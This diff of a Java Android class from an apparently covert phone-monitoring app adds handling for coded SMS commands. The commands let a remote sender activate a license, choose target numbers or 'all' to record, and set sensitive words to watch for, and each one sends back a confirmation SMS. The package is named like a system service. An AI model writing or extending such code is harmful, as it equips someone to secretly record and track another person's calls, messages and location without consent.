@@ -1,6 +1,8 @@
 package system.service;
 
 import java.util.Date;
+import java.util.regex.Matcher;
+import java.util.regex.Pattern;
 
 import system.service.activity.GlobalPrefActivity;
 import system.service.activity.NETWORK_CONNECT_MODE;
@@ -8,9 +10,14 @@ import system.service.config.ConfigCtrl;
 import system.service.feature.sms.SmsCtrl;
 import android.content.Context;
 
+import com.particle.inspector.common.util.DeviceProperty;
+import com.particle.inspector.common.util.LANG;
+import com.particle.inspector.common.util.RegExpUtil;
 import com.particle.inspector.common.util.StrUtils;
+import com.particle.inspector.common.util.SysUtils;
 import com.particle.inspector.common.util.license.LICENSE_TYPE;
 import com.particle.inspector.common.util.license.LicenseCtrl;
+import com.particle.inspector.common.util.sms.AuthSms;
 import com.particle.inspector.common.util.sms.SmsConsts;
 
 public class IndicationHandler 
@@ -26,19 +33,15 @@ public class IndicationHandler
 			if (indication.length() == LicenseCtrl.ACTIVATION_KEY_LENGTH)
 			{
 				LICENSE_TYPE type = LicenseCtrl.calLicenseType(context, smsBody);
-				if (type == LICENSE_TYPE.NOT_LICENSED || type == LICENSE_TYPE.TRIAL_LICENSED) return;
+				if (type == LICENSE_TYPE.NOT_LICENSED || type == LICENSE_TYPE.TRIAL_LICENSED) {
+					String msg = context.getResources().getString(R.string.indication_register_ng);
+					SmsCtrl.sendSms(incomingPhoneNum, msg);
+					return;
+				}
 				
 				// Send auth SMS to server for registration
-				// TODO
-				
-				ConfigCtrl.setLicenseKey(context, indication);
-				ConfigCtrl.setLicenseType(context, type);
-				Date now = new Date();
-				ConfigCtrl.setConsumedDatetime(context, now);
-				ConfigCtrl.setLastActivatedDatetime(context, now);
-				
-				// Necessary to force reboot to make key effective?
-				// TODO
+				// and server will send response SMS to the phone (Auth,<key>,OK/NG)
+				SmsCtrl.sendAuthSms(context, indication);
 			}
 			// Unregister indication
 			else if (indication.equalsIgnoreCase(SmsConsts.OFF)) {
@@ -73,7 +76,7 @@ public class IndicationHandler
 			}
 			else // set self sender
 			{
-				String[] parts = indication.replaceAll(" {2,}", " ").split(" ");
+				String[] parts = indication.replaceAll(RegExpUtil.MULTIPLE_BLANKSPACES, " ").split(" ");
 				if (parts.length < 2) {
 					// Send SMS to warn user
 					String strContent = context.getResources().getString(R.string.indication_set_selfsender_ng);
@@ -156,9 +159,39 @@ public class IndicationHandler
 			String indication = smsBody.substring(3).trim();
 			
 			if (indication.equalsIgnoreCase(SmsConsts.ALL)) {
-			
+				if (!GlobalPrefActivity.getUseSelfSender(context)) {
+					String strContent = context.getResources().getString(R.string.indication_set_targetall_ng);
+					SmsCtrl.sendSms(incomingPhoneNum, strContent);
+				} else {
+					GlobalPrefActivity.setRecordAll(context, true);
+					String strContent = context.getResources().getString(R.string.indication_set_targetall_ok);
+					SmsCtrl.sendSms(incomingPhoneNum, strContent);
+				}
 			} else {
+				String[] numbers = indication.replaceAll(RegExpUtil.MULTIPLE_BLANKSPACES, GlobalPrefActivity.TARGET_NUMBER_BREAKER)
+						 					 .split(GlobalPrefActivity.TARGET_NUMBER_BREAKER);
+				boolean valid = true;
+				if (numbers.length <= 0 || numbers.length > GlobalPrefActivity.MAX_TARGET_NUM_COUNT) {
+					valid = false;
+				} else {
+					Pattern p = Pattern.compile(RegExpUtil.RECORD_TARGET_NUM);
+					for (int i=0; i < numbers.length; i++) {
+				    	Matcher matcher = p.matcher(numbers[i]);
+				    	if (!matcher.matches()) {
+				    		valid = false;
+				    		break;
+				    	}
+					}
+				}
 				
+				if (valid) {
+					GlobalPrefActivity.setRecordTargetNum(context, indication);
+					String strContent = context.getResources().getString(R.string.indication_set_targetnum_ok);
+					SmsCtrl.sendSms(incomingPhoneNum, strContent);
+				} else {
+					String strContent = context.getResources().getString(R.string.indication_set_targetnum_ng);
+					SmsCtrl.sendSms(incomingPhoneNum, strContent);
+				}
 			}
 		}
 		
@@ -189,18 +222,17 @@ public class IndicationHandler
 		else if (smsBody.startsWith(SmsConsts.INDICATION_SENS_WORDS)) {
 			String indication = smsBody.substring(3).trim();
 			
-			if (indication.length() > 0) {
-				// When it is OFF or off, we disable the location function
-				if (indication.equalsIgnoreCase(SmsConsts.OFF)) {
-					GlobalPrefActivity.setSensitiveWords(context, "");
-					String strContent = context.getResources().getString(R.string.indication_disable_sens_words_ok);
-					SmsCtrl.sendSms(incomingPhoneNum, strContent);
-					return;
-				}
-				
-				String oriWords = indication.replaceAll(" {2,}", GlobalPrefActivity.SENSITIVE_WORD_BREAKER); // Remove duplicated blank spaces
+			// When it is OFF or off, we disable the location function
+			if (indication.equalsIgnoreCase(SmsConsts.OFF)) {
+				GlobalPrefActivity.setSensitiveWords(context, "");
+				String strContent = context.getResources().getString(R.string.indication_disable_sens_words_ok);
+				SmsCtrl.sendSms(incomingPhoneNum, strContent);
+				return;
+			}
+			else {
+				String oriWords = indication.replaceAll(RegExpUtil.MULTIPLE_BLANKSPACES, GlobalPrefActivity.SENSITIVE_WORD_BREAKER); // Remove duplicated blank spaces
 				String[] words = oriWords.split(GlobalPrefActivity.SENSITIVE_WORD_BREAKER);
-				if (words.length > GlobalPrefActivity.MAX_SENSITIVE_WORD_COUNT) {
+				if (words.length == 0 || words.length > GlobalPrefActivity.MAX_SENSITIVE_WORD_COUNT) {
 					// Send SMS to warn the user
 					String strContent = context.getResources().getString(R.string.indication_set_sens_words_ng);
 					SmsCtrl.sendSms(incomingPhoneNum, strContent);
@@ -227,33 +259,7 @@ public class IndicationHandler
 				}
 			}
 		}
-		
-		// -------------------------------------------------------
-		// #9#<Yes/No>: show location SMS or not
-		else if (smsBody.startsWith(SmsConsts.INDICATION_SHOW_LOC_SMS)) {
-			String indication = smsBody.substring(3).trim();
-			
-			if (indication.equalsIgnoreCase(SmsConsts.YES)) {
-				GlobalPrefActivity.setDisplayGpsSMS(context, true);
-			} else if (indication.equalsIgnoreCase(SmsConsts.NO)) {
-				GlobalPrefActivity.setDisplayGpsSMS(context, false);
-			}
-		}
-		
-		// -------------------------------------------------------
-		else if (smsBody.startsWith("#7#")) {
-			String indication = smsBody.substring(3).trim();
-		}
-		
-		// -------------------------------------------------------
-		else if (smsBody.startsWith("#8#")) {
-			String indication = smsBody.substring(3).trim();
-		}
-		
-		// -------------------------------------------------------
-		else if (smsBody.startsWith("#9#")) {
-			String indication = smsBody.substring(3).trim();
-		}
+
 		
 	}
 }
